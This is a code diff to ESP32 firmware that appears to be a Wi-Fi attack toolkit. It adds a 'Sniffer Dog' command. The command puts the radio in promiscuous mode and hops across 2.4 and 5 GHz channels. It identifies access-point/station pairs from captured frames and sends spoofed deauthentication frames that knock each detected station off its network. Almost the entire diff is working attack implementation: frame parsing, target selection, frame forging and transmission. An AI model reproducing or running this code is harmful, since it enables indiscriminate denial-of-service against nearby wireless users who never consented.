@@ -174,6 +174,13 @@ static volatile bool periodic_rescan_in_progress = false; // Flag to suppress lo
 static TaskHandle_t sae_attack_task_handle = NULL;
 static volatile bool sae_attack_active = false;
 
+// Sniffer Dog attack task
+static TaskHandle_t sniffer_dog_task_handle = NULL;
+static volatile bool sniffer_dog_active = false;
+static int sniffer_dog_current_channel = 1;
+static int sniffer_dog_channel_index = 0;
+static int64_t sniffer_dog_last_channel_hop = 0;
+
 // Wardrive task
 static TaskHandle_t wardrive_task_handle = NULL;
 
@@ -227,7 +234,17 @@ int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
 
 void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
     ESP_LOG_BUFFER_HEXDUMP(TAG, frame_buffer, size, ESP_LOG_DEBUG);
-    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
+
+
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
+    if (err == ESP_ERR_NO_MEM) {
+        //give it a breath:
+        vTaskDelay(pdMS_TO_TICKS(20));
+        MY_LOG_INFO(TAG, "esp_wifi_80211_tx returned ESP_ERR_NO_MEM: %d", heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
+        return; // lub ponów próbę później
+    }
+
+    //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
 }
 
 
@@ -309,6 +326,11 @@ static esp_err_t captive_detection_handler(httpd_req_t *req);
 static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
 static void sniffer_process_scan_results(void);
 static void sniffer_channel_hop(void);
+// Sniffer Dog functions
+static int cmd_start_sniffer_dog(int argc, char **argv);
+static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
+static void sniffer_dog_task(void *pvParameters);
+static void sniffer_dog_channel_hop(void);
 static void sniffer_channel_task(void *pvParameters);
 static bool is_multicast_mac(const uint8_t *mac);
 static bool is_broadcast_bssid(const uint8_t *bssid);
@@ -1897,6 +1919,34 @@ static int cmd_stop(int argc, char **argv) {
         MY_LOG_INFO(TAG, "Sniffer stopped. Data preserved - use 'show_sniffer_results' to view.");
     }
     
+    // Stop sniffer_dog if active
+    if (sniffer_dog_active || sniffer_dog_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Stopping Sniffer Dog task...");
+        sniffer_dog_active = false;
+        
+        // Wait a bit for task to finish
+        for (int i = 0; i < 20 && sniffer_dog_task_handle != NULL; i++) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+        
+        // Force delete if still running
+        if (sniffer_dog_task_handle != NULL) {
+            vTaskDelete(sniffer_dog_task_handle);
+            sniffer_dog_task_handle = NULL;
+            MY_LOG_INFO(TAG, "Sniffer Dog task forcefully stopped.");
+        }
+        
+        // Disable promiscuous mode
+        esp_wifi_set_promiscuous(false);
+        
+        // Reset channel state
+        sniffer_dog_channel_index = 0;
+        sniffer_dog_current_channel = dual_band_channels[0];
+        sniffer_dog_last_channel_hop = 0;
+        
+        MY_LOG_INFO(TAG, "Sniffer Dog stopped.");
+    }
+    
     // Stop wardrive task if running
     if (wardrive_active || wardrive_task_handle != NULL) {
         MY_LOG_INFO(TAG, "Stopping wardrive task...");
@@ -2156,6 +2206,77 @@ static int cmd_sniffer_debug(int argc, char **argv) {
         MY_LOG_INFO(TAG, "- AP matching process");
         MY_LOG_INFO(TAG, "- Reason for packet acceptance/rejection");
     }
+    
+    return 0;
+}
+
+static int cmd_start_sniffer_dog(int argc, char **argv) {
+    (void)argc; (void)argv;
+    
+    // Reset stop flag at the beginning of operation
+    operation_stop_requested = false;
+    
+    if (sniffer_dog_active) {
+        MY_LOG_INFO(TAG, "Sniffer Dog already active. Use 'stop' to stop it first.");
+        return 1;
+    }
+    
+    if (sniffer_active) {
+        MY_LOG_INFO(TAG, "Regular sniffer is active. Use 'stop' to stop it first.");
+        return 1;
+    }
+    
+    MY_LOG_INFO(TAG, "Starting Sniffer Dog mode...");
+    
+    // Activate sniffer_dog
+    sniffer_dog_active = true;
+    
+    // Set LED to red (aggressive mode)
+    esp_err_t led_err = led_strip_set_pixel(strip, 0, 255, 0, 0); // Red
+    if (led_err == ESP_OK) {
+        led_strip_refresh(strip);
+    }
+    
+    // Set promiscuous filter
+    esp_wifi_set_promiscuous_filter(&sniffer_filter);
+    
+    // Enable promiscuous mode with sniffer_dog callback
+    esp_wifi_set_promiscuous_rx_cb(sniffer_dog_promiscuous_callback);
+    esp_wifi_set_promiscuous(true);
+    
+    // Initialize dual-band channel hopping
+    sniffer_dog_channel_index = 0;
+    sniffer_dog_current_channel = dual_band_channels[0];
+    esp_wifi_set_channel(sniffer_dog_current_channel, WIFI_SECOND_CHAN_NONE);
+    sniffer_dog_last_channel_hop = esp_timer_get_time() / 1000;
+    
+    // Create channel hopping task
+    BaseType_t task_created = xTaskCreate(
+        sniffer_dog_task,
+        "sniffer_dog",
+        4096,
+        NULL,
+        5,
+        &sniffer_dog_task_handle
+    );
+    
+    if (task_created != pdPASS) {
+        MY_LOG_INFO(TAG, "Failed to create Sniffer Dog channel hopping task");
+        sniffer_dog_active = false;
+        esp_wifi_set_promiscuous(false);
+        
+        // Clear LED
+        led_err = led_strip_clear(strip);
+        if (led_err == ESP_OK) {
+            led_strip_refresh(strip);
+        }
+        
+        return 1;
+    }
+    
+    MY_LOG_INFO(TAG, "Sniffer Dog started - hunting for AP-STA pairs...");
+    MY_LOG_INFO(TAG, "Deauth packets will be sent to detected stations.");
+    MY_LOG_INFO(TAG, "Use 'stop' to stop.");
     
     return 0;
 }
@@ -3522,6 +3643,15 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&sniffer_debug_cmd));
 
+    const esp_console_cmd_t sniffer_dog_cmd = {
+        .command = "start_sniffer_dog",
+        .help = "Starts Sniffer Dog - captures AP-STA pairs and sends targeted deauth packets",
+        .hint = NULL,
+        .func = &cmd_start_sniffer_dog,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&sniffer_dog_cmd));
+
     const esp_console_cmd_t select_cmd = {
         .command = "select_networks",
         .help = "Selects networks by indexes: select_networks 0 2 5",
@@ -3709,6 +3839,7 @@ void app_main(void) {
     MY_LOG_INFO(TAG,"  show_sniffer_results");
     MY_LOG_INFO(TAG,"  show_probes");
     MY_LOG_INFO(TAG,"  sniffer_debug <0|1>");
+    MY_LOG_INFO(TAG,"  start_sniffer_dog");
     MY_LOG_INFO(TAG,"  stop");
     MY_LOG_INFO(TAG,"  reboot");
 
@@ -3725,6 +3856,7 @@ void app_main(void) {
     vTaskDelay(pdMS_TO_TICKS(500));
     MY_LOG_INFO(TAG,"BOARD READY");
     vTaskDelay(pdMS_TO_TICKS(100));
+    
 }
 
 void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count) {   
@@ -4635,6 +4767,175 @@ static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t 
             }
         }
     }
+}
+
+// === SNIFFER DOG HELPER FUNCTIONS ===
+
+// Channel hopping for sniffer_dog
+static void sniffer_dog_channel_hop(void) {
+    if (!sniffer_dog_active) {
+        return;
+    }
+    
+    // Use dual-band channel hopping
+    sniffer_dog_current_channel = dual_band_channels[sniffer_dog_channel_index];
+    
+    sniffer_dog_channel_index++;
+    if (sniffer_dog_channel_index >= dual_band_channels_count) {
+        sniffer_dog_channel_index = 0;
+    }
+    
+    esp_wifi_set_channel(sniffer_dog_current_channel, WIFI_SECOND_CHAN_NONE);
+    sniffer_dog_last_channel_hop = esp_timer_get_time() / 1000;
+}
+
+// Task that handles channel hopping for sniffer_dog
+static void sniffer_dog_task(void *pvParameters) {
+    (void)pvParameters;
+    
+    while (sniffer_dog_active) {
+        vTaskDelay(pdMS_TO_TICKS(50)); // Check every 50ms
+        
+        if (!sniffer_dog_active) {
+            continue;
+        }
+        
+        // Force channel hop if 250ms passed
+        int64_t current_time = esp_timer_get_time() / 1000;
+        bool time_expired = (current_time - sniffer_dog_last_channel_hop >= sniffer_channel_hop_delay_ms);
+        
+        if (time_expired) {
+            sniffer_dog_channel_hop();
+        }
+    }
+    
+    MY_LOG_INFO(TAG, "Sniffer Dog channel task ending");
+    sniffer_dog_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+// Promiscuous callback for sniffer_dog - captures AP-STA pairs and sends deauth
+static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
+    static uint32_t deauth_sent_count = 0;
+    
+    if (!sniffer_dog_active) {
+        return;
+    }
+    
+    // Filter only MGMT and DATA packets
+    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) {
+        return;
+    }
+    
+    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    const uint8_t *frame = pkt->payload;
+    int len = pkt->rx_ctrl.sig_len;
+    
+    if (len < 24) { // Minimum 802.11 header size
+        return;
+    }
+    
+    // Parse 802.11 header
+    uint8_t frame_type = frame[0] & 0xFC;
+    uint8_t to_ds = (frame[1] & 0x01) != 0;
+    uint8_t from_ds = (frame[1] & 0x02) != 0;
+    
+    // Extract addresses
+    uint8_t *addr1 = (uint8_t *)&frame[4];   // Address 1
+    uint8_t *addr2 = (uint8_t *)&frame[10];  // Address 2  
+    uint8_t *addr3 = (uint8_t *)&frame[16];  // Address 3
+    
+    uint8_t *ap_mac = NULL;
+    uint8_t *sta_mac = NULL;
+    
+    // Identify AP and STA based on frame type and DS bits
+    if (type == WIFI_PKT_DATA) {
+        // For DATA frames, use DS bits to determine direction
+        if (to_ds && !from_ds) {
+            // STA -> AP
+            sta_mac = addr2;  // Source is STA
+            ap_mac = addr1;   // Destination is AP (BSSID)
+        } else if (!to_ds && from_ds) {
+            // AP -> STA
+            ap_mac = addr2;   // Source is AP (BSSID)
+            sta_mac = addr1;  // Destination is STA
+        } else if (to_ds && from_ds) {
+            // WDS (Wireless Distribution System) - skip
+            return;
+        } else {
+            // Ad-hoc or other - skip
+            return;
+        }
+    } else if (type == WIFI_PKT_MGMT) {
+        // For MGMT frames, analyze frame type
+        switch (frame_type) {
+            case 0x00: // Association Request
+            case 0x20: // Reassociation Request
+            case 0xB0: // Authentication
+                sta_mac = addr2; // Source is STA
+                ap_mac = addr1;  // Destination is AP
+                break;
+                
+            case 0x10: // Association Response
+            case 0x30: // Reassociation Response
+                ap_mac = addr2;  // Source is AP
+                sta_mac = addr1; // Destination is STA
+                break;
+                
+            case 0x80: // Beacon
+            case 0x40: // Probe Request
+            case 0x50: // Probe Response
+                // Skip - not AP-STA pairs
+                return;
+                
+            default:
+                // Unknown or not relevant
+                return;
+        }
+    }
+    
+    // Validate AP and STA addresses
+    if (!ap_mac || !sta_mac) {
+        return;
+    }
+    
+    // Skip broadcast/multicast addresses
+    if (is_broadcast_bssid(ap_mac) || is_broadcast_bssid(sta_mac) ||
+        is_multicast_mac(ap_mac) || is_multicast_mac(sta_mac) ||
+        is_own_device_mac(ap_mac) || is_own_device_mac(sta_mac)) {
+        return;
+    }
+    
+    // We have a valid AP-STA pair! Send 5 deauth packets
+    // Create deauth frame from AP to STA (not broadcast!)
+    uint8_t deauth_frame[sizeof(deauth_frame_default)];
+    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+    
+    // Set destination to specific STA (not broadcast!)
+    memcpy(&deauth_frame[4], sta_mac, 6);
+    // Set source to AP
+    memcpy(&deauth_frame[10], ap_mac, 6);
+    // Set BSSID to AP
+    memcpy(&deauth_frame[16], ap_mac, 6);
+    
+    // Send deauth frame for more effective disconnection
+
+    // Blue LED flash to indicate deauth sent
+    led_strip_set_pixel(strip, 0, 0, 0, 255); // Blue
+    led_strip_refresh(strip);
+
+    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+    deauth_sent_count++;
+    
+    led_strip_set_pixel(strip, 0, 255, 0, 0); // Back to red
+    led_strip_refresh(strip);
+    
+    // Log statistics for this AP-STA pair
+    MY_LOG_INFO(TAG, "[SnifferDog #%lu] DEAUTH sent: AP=%02X:%02X:%02X:%02X:%02X:%02X -> STA=%02X:%02X:%02X:%02X:%02X:%02X (Ch=%d, RSSI=%d)",
+               deauth_sent_count,
+               ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],
+               sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5],
+               sniffer_dog_current_channel, pkt->rx_ctrl.rssi);
 }
 
 // === WARDRIVE HELPER FUNCTIONS ===
